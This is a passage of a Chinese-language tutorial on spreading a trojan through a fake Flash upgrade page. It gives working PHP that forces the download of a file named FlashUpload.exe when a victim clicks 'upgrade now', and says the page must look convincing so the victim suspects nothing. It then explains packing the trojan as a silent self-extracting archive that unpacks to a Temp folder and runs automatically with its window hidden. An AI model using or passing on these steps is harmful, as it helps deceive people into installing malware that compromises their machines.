二、配置木马下载

我们要的效果是点击立即升级之后木马会立即下载，其次页面要做的逼真不能穿帮

配置访问下载的php

  1. <?php
  2. header("Content-type:text/html;charset=utf-8"); 
  3. $file_name="FlashUpload.exe"; 
  4. //解决中文不能显示出来的问题
  5. $file_name=iconv("utf-8","gb2312",$file_name); 
  6. $path1=$_SERVER['DOCUMENT_ROOT'];
  7. $filepath=$path1."/".$file_name; 
  8. //判断文件是否存在
  9. if(!file_exists($filepath)){ 
  10. echo "没有该文件文件"; 
  11. return ; 
  12. } 

  14. $fp=fopen($filepath,"r"); 
  15. $file_size=filesize($filepath); 
  16. //下载文件需要用到的头
  17. Header("Content-type: application/octet-stream"); 
  18. Header("Accept-Ranges: bytes"); 
  19. Header("Accept-Length:".$file_size); 
  20. Header("Content-Disposition: attachment; filename=".$file_name); 
  21. $buffer=1024; 
  22. $file_count=0; 
  23. //向浏览器返回数据
  24. while(!feof($fp) && $file_count<$file_size){ 
  25. $file_con=fread($fp,$buffer); 
  26. $file_count+=$buffer; 
  27. echo $file_con; 
  28. } 
  29. fclose($fp); 
  30. ?>

访问之后会下载当前目录下的FlashUpload.exe文件，路径和文件名根据自己的来


三、木马自解压

将木马添加到压缩文件，勾选上自解压格式和删除原来文件




在高级选项中选择自解压选项

解压路径选择C盘的某个Temp就好（推荐）


配置上解压自动运行



模式里边选择全部隐藏，这个地方隐藏之后是看不到解压界面的，双击之后直接复制到目录运行
